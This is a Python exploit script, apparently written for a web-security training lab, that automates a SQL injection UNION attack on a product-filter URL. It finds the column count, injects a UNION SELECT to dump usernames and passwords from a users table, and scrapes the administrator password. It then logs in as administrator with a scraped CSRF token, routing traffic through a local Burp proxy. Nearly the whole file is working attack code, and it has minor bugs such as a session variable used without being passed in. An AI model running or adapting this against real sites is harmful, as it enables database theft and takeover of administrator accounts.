import requests
import urllib3
import sys
from bs4 import BeautifulSoup

#connects to burp suite to process resp from web page to burp to o/p terminal vice versa
proxies = {'http':'http://127.0.0.1:8082','https':'http://127.0.0.1:8082'}
#disable uneseccary warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#parses or processes html response to retrieve csrf token required for login
def getCSRF(sl):
    soup = BeautifulSoup(sl.text, 'html.parser') #refer Beautiful soup docs it is used to parse html text
    csrf = soup.find('input')['value'] #finds input tag of param value and retrieves value of csrf token #see burp response to https://link.com/login
    return csrf

#parses or processes html response to retrieve username and password required for login
def username_and_password_retrieve(r):
    soup = BeautifulSoup(r.text, 'html.parser')
    # below is for accessing html table element of response r and r.text refers to the html part of the response for the code from here refer to this https://www.datasciencecentral.com/how-to-use-python-to-loop-through-html-tables-and-scrape-tabular-data/
    # or
    #password = soup.body.find(text=administrator).parent.find_next('td').contents[0]
    table = soup.find('table', class_ = 'is-table-longdescription') #name of table
    for data in table.find_all('tbody'): #see burp response to link https://something.link.com?category=gifts'payload tbody is element that wraps data
        rows = data.find_all('tr') #gets all rows
        for row in rows :
            name = row.find_all('th')[0].text #[0] is for grabbing only text of html table row part it finds th name element for a row
            if (name == "administrator"):
                password = row.find_all('td')[0].text #retrieves password of administrator
                return name, password



#find the no of columns in table and have the type text
def unionattack2(fullpath):
    load = "' UNION SELECT "
    for i in range(1,10):
        if (i == 1):
            fullpayload = load + "'abc'"
        else:
            fullpayload = fullpayload +", "+"'abc'"

        full = fullpath + fullpayload + "--"
        rs = requests.get(full, verify=False, proxies=proxies)
        if rs.status_code == 200:
            print("[+] No of columns is",i)
            print("Full path of url is",full)
            break



#executes this command '+UNION+SELECT+username,+password+FROM+users--
def command_execution_for_username_and_password(fullurl, columnname1, columnname2, tablename, url):
    payload = "' UNION SELECT {0}, {1} FROM {2}--".format(columnname1, columnname2, tablename)
    urlwithpayload = fullurl + payload
    r = requests.get(urlwithpayload, verify=False, proxies=proxies)
    username,password = username_and_password_retrieve(r)

    print("The admin's user name is %s" %username)
    print("The admin's password is %s"%password)

    username_and_password_retrieve(r)
    login(s, username, password, url)


#then logs in using these creds and see if successfully logged in as admin
def login(s, username, password, url):
  uri = '/login'
  fullurl2 = url + uri
  sl = s.get(fullurl2, verify=False, proxies=proxies)
  csrf = getCSRF(sl)
  data = {
      'csrf': csrf,
      'username': username,
      'password': password
  }
  sp = s.post(fullurl2, verify=False, proxies=proxies, data=data)
  if "Log out" in sp.text:
      print("[+] Logged in as admin ......SQL injection UNION attack, retrieving data from other tables successful")
  else:
      print("[+] Log in as admin unsuccessful.........")





def retrieve_data_from_other_tables(fullurl, columnname1, columnname2, tablename, url):
#then execute this command '+UNION+SELECT+username,+password+FROM+users-- to retrieve administrator username and password
  command_execution_for_username_and_password(fullurl, columnname1, columnname2, tablename, url)













if '__main__' == __name__:
    try:
        url = sys.argv[1].strip()
        path = "/filter?category=Accessories"
        fullurl = url + path
        columnname1 = sys.argv[2].strip()
        columnname2 = sys.argv[3].strip()
        tablename = sys.argv[4].strip()

    except IndexError:
        print('[+] Usage <url> <columnname1> <columnname2> <tablename> %s' %sys.argv[0])
        print("[+] Example example.com column column1 users %s"%sys.argv[0])
        sys.exit(1)
    s = requests.Session()
    #retrieve_data_from_other_tables()
    unionattack2(fullurl)
    #retrieve_data_from_other_tables(fullurl, columnname1, columnname2, tablename)
    command_execution_for_username_and_password(fullurl, columnname1, columnname2, tablename, url)






